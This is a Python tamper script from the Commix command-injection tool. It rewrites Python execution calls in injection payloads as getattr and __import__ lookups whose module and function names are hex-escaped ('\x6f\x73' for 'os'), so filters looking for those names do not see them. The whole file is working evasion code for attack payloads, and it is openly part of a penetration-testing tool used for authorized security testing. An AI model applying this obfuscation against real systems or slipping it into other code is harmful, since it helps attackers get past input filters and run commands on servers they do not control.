#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
from src.utils import settings
from src.core.controller import checks

r"""
About: Runs the command through a Python module and function named in hex ("\x6f\x73", "\x70\x6f\x70\x65\x6e").
Notes: This tamper script works against target(s) evaluating Python (i.e. option '--eval=python').
"""

__tamper__ = "pyhexname"
__priority__ = settings.PRIORITY.HIGH

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "python")

"""
The module a name with no module of its own is reached through.

'eval' and 'exec' are built in, so there is no import spelling them out - but they are attributes
of a module like any other, and naming that module gives them somewhere to be looked up from.
"""
BUILTINS = "builtins"

# An attribute fetched by a name the payload never spells, and called on the spot.
ATTRIBUTE_OF = "getattr("
IMPORT_OF = "__import__("

# The execution functions this language writes whole: a module imported, then an attribute of it.
IMPORTED_FUNCTION = r"^__import__\(\"([^\"]+)\"\)\.(\w+)$"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# The name as the escapes Python reads back as that name, leaving no letter of it in the payload.
def _hex_name(name):
  return "\"" + "".join("\\x%02x" % ord(char) for char in name) + "\""

"""
The module and the attribute a function is reached by, both named in hex.

Written as a lookup rather than as the call itself, because an attribute cannot be reached by an
escaped name the way a string can - 'getattr' is what turns the name back into the thing.
"""
def _looked_up(module, attribute):
  return ATTRIBUTE_OF + IMPORT_OF + _hex_name(module) + ")," + _hex_name(attribute) + ")"

# Run the command through a module and function named in hex, wherever the payload runs one.
def tamper(payload):
  # Longest first, so a bare name is not rewritten out of the middle of an imported one.
  for name in sorted(settings.EXECUTION_FUNCTIONS_LVL3, key=len, reverse=True):
    imported = re.match(IMPORTED_FUNCTION, name)
    if imported:
      looked_up = _looked_up(imported.group(1), imported.group(2))
    else:
      looked_up = _looked_up(BUILTINS, name)
    # Only where the name opens a call of its own, so the call's own closing bracket still closes
    # the new one. A lambda, so that the backslashes the replacement is made of stay backslashes.
    payload = re.sub(r"(?<![\w\\])" + re.escape(name) + r"\(", lambda x: looked_up + "(", payload)
  return payload

# eof
